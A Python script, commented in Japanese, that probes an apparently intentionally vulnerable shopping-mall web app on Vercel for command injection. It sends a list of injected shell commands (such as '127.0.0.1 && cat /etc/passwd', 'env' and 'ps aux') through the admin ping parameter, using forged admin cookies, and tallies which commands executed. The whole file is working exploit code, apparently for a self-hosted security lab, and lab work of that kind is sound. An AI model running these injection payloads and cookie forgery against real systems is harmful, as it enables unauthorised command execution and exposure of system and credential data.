#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
フィルタリング無効化版でのVercel環境コマンドテスト
実際にフィルタリングなしで何が実行できるかを調査
"""

import requests
import urllib.parse

def test_vercel_without_filter():
    """フィルタリング無効化版でのテスト"""
    
    print("🔍 フィルタリング無効化版でのVercel環境コマンド調査")
    print("=" * 60)
    print("⚠️  注意: この調査のためにフィルタリングを一時的に無効化します")
    print()
    
    base_url = "https://vulnerable-shopping-mall21.vercel.app/admin/system?target="
    
    # より基本的なコマンドから段階的にテスト
    basic_commands = [
        # シンプルなechoテスト
        "127.0.0.1 && echo hello",
        "127.0.0.1; echo test",
        "localhost | echo working",
        
        # Python実行テスト
        "127.0.0.1 && python3 -c 'print(\"python works\")'",
        "127.0.0.1 && python -c 'print(\"python2 works\")'",
        
        # 基本システムコマンド
        "127.0.0.1 && whoami",
        "127.0.0.1 && pwd",
        "127.0.0.1 && ls",
        "127.0.0.1 && uname -a",
        "127.0.0.1 && hostname",
        
        # 環境変数
        "127.0.0.1 && env",
        "127.0.0.1 && echo $PATH",
        "127.0.0.1 && echo $HOME",
        
        # ファイル操作
        "127.0.0.1 && ls -la",
        "127.0.0.1 && cat /proc/version",
        "127.0.0.1 && cat /etc/passwd",
        
        # プロセス
        "127.0.0.1 && ps",
        "127.0.0.1 && ps aux",
    ]
    
    print("📋 テスト対象コマンド:")
    for i, cmd in enumerate(basic_commands, 1):
        print(f"{i:2d}. {cmd}")
    print()
    
    working_commands = []
    failed_commands = []
    
    for i, cmd in enumerate(basic_commands, 1):
        print(f"🧪 [{i:2d}/{len(basic_commands)}] テスト中: {cmd}")
        
        try:
            # URLエンコード
            encoded_cmd = urllib.parse.quote(cmd)
            url = f"{base_url}{encoded_cmd}"
            
            # 管理者Cookie設定
            cookies = {
                'user_id': '1',
                'username': 'admin',
                'is_admin': 'True',
                'role': 'user'
            }
            
            # リクエスト送信
            response = requests.get(url, cookies=cookies, timeout=20)
            
            if response.status_code == 200:
                # Ping結果を抽出
                if 'Ping結果:' in response.text:
                    start = response.text.find('<pre class="bg-dark text-light p-3">') + len('<pre class="bg-dark text-light p-3">')
                    end = response.text.find('</pre>', start)
                    
                    if start > 0 and end > start:
                        result = response.text[start:end].strip()
                        
                        # 成功判定（より詳細に）
                        if "exit code 127" in result:
                            print(f"    ❌ コマンドが見つからない: command not found")
                            failed_commands.append((cmd, "command not found"))
                        elif "exit code" in result and "exit code 0" not in result:
                            print(f"    ⚠️  コマンドエラー: {result[:100]}...")
                            failed_commands.append((cmd, f"exit error: {result[:50]}"))
                        elif "No output" in result:
                            print(f"    🔍 実行されたが出力なし")
                            working_commands.append((cmd, "executed but no output"))
                        elif "failed" in result.lower() and "ping" in result.lower():
                            # Pingが失敗してもコマンドは実行されている可能性
                            if "exit code 0" in result:
                                print(f"    ✅ 成功（Ping失敗だがコマンド実行済み）: {result[:100]}...")
                                working_commands.append((cmd, result))
                            else:
                                print(f"    ❌ 失敗: {result[:100]}...")
                                failed_commands.append((cmd, result[:100]))
                        else:
                            print(f"    ✅ 成功: {result[:100]}...")
                            working_commands.append((cmd, result))
                    else:
                        print(f"    ⚠️  レスポンス解析失敗")
                        failed_commands.append((cmd, "parse error"))
                else:
                    print(f"    ❌ Ping結果セクションが見つからない")
                    failed_commands.append((cmd, "no ping result section"))
            else:
                print(f"    ❌ HTTPエラー: {response.status_code}")
                failed_commands.append((cmd, f"HTTP {response.status_code}"))
                
        except Exception as e:
            print(f"    💥 例外: {str(e)}")
            failed_commands.append((cmd, f"exception: {str(e)}"))
    
    # 詳細結果表示
    print("\n\n🎉 詳細調査結果")
    print("=" * 60)
    
    if working_commands:
        print(f"\n✅ 動作するコマンド ({len(working_commands)}個):")
        print("-" * 50)
        for cmd, result in working_commands:
            print(f"\n🔧 コマンド: {cmd}")
            print(f"📤 結果: {result}")
            print("=" * 40)
    else:
        print("\n❌ 動作するコマンドは見つかりませんでした")
    
    print(f"\n⚠️  失敗したコマンド ({len(failed_commands)}個):")
    print("-" * 50)
    for cmd, reason in failed_commands:
        print(f"• {cmd}")
        print(f"  理由: {reason}")
    
    success_rate = len(working_commands) / len(basic_commands) * 100
    print(f"\n📊 成功率: {len(working_commands)}/{len(basic_commands)} ({success_rate:.1f}%)")
    
    # 結論
    if working_commands:
        print("\n🎯 結論: フィルタリングが原因でした！")
        print("Vercel環境でも一部のコマンドは実行可能です。")
    else:
        print("\n🤔 結論: フィルタリング以外の制約があるようです。")
        print("Vercel環境自体がコマンド実行を制限している可能性があります。")

if __name__ == "__main__":
    print("⚠️  重要: このテストは一時的にフィルタリングを無効化することを前提としています")
    print("実際のテストを行う前に、admin.pyのフィルタリング機能を無効化してください")
    print()
    
    # とりあえず現在の状態でテスト
    test_vercel_without_filter()